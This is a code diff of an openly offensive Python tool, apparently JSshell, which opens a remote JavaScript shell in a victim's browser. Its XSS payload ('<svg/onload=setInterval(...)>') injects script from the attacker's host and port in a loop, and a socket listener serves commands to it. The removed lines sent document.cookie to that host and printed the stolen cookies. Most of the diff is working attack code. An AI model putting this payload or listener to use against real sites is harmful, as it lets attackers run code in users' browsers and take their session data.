@@ -21,8 +21,7 @@ banner = '''%s    __
 hp = '''JSshell using javascript code as shell commands. Also supports some commands:
 help                  This help
 domain                The source domain
-path                  The source path
-cookie                The current cookies
+pwd                   The source path
 exit, quit            Exit the JS shell'''
 
 
@@ -50,7 +49,7 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s/"+document.cookie},999)>\n' % (blue, host, port)
+payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s/"},999)>\n' % (blue, host, port)
 
 
 print(banner)
@@ -72,7 +71,7 @@ Connection: close
         if secs != 0:
             s.settimeout(secs)
         buffer = input('%s$ %s' % (blue, white))
-        s.listen(0)
+        s.listen(2)
         try:
             c, a = s.accept()
             data = c.recv(1024)
@@ -86,14 +85,9 @@ Connection: close
                     print('Could not get the source domain because the referer has been disabled')
             elif buffer == 'pwd':
                 try:
-                    print(path)
+                    print('/' + path)
                 except:
                     print('Could not get the source path because the referer has been disabled')
-            elif buffer == 'cookie':
-                if len(cookie):
-                    print(cookie)
-                else:
-                    print('No cookies')
             elif buffer == 'help':
                 print(hp)
                               
@@ -130,12 +124,10 @@ def main():
         
     if 'Accept' in resp and 'HTTP' in resp:
         print ('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
-        reqpth = resp.split('\n')[0].split('/')
-        cookie = ''.join(reqpth).replace(reqpth[0], '').replace(reqpth[-1], '').split(' ')[0]
         for line in resp.split('\n'):
             if 'referer' in line.lower():
                 referer = line.lower().replace('referer: ', '')
-                domain = referer.split('/')[3]
+                domain = referer.split('/')[2]
                 pth = '/'.join(referer.split('/')[3:])
         if len(cmd):
             c.send(cmd.encode())
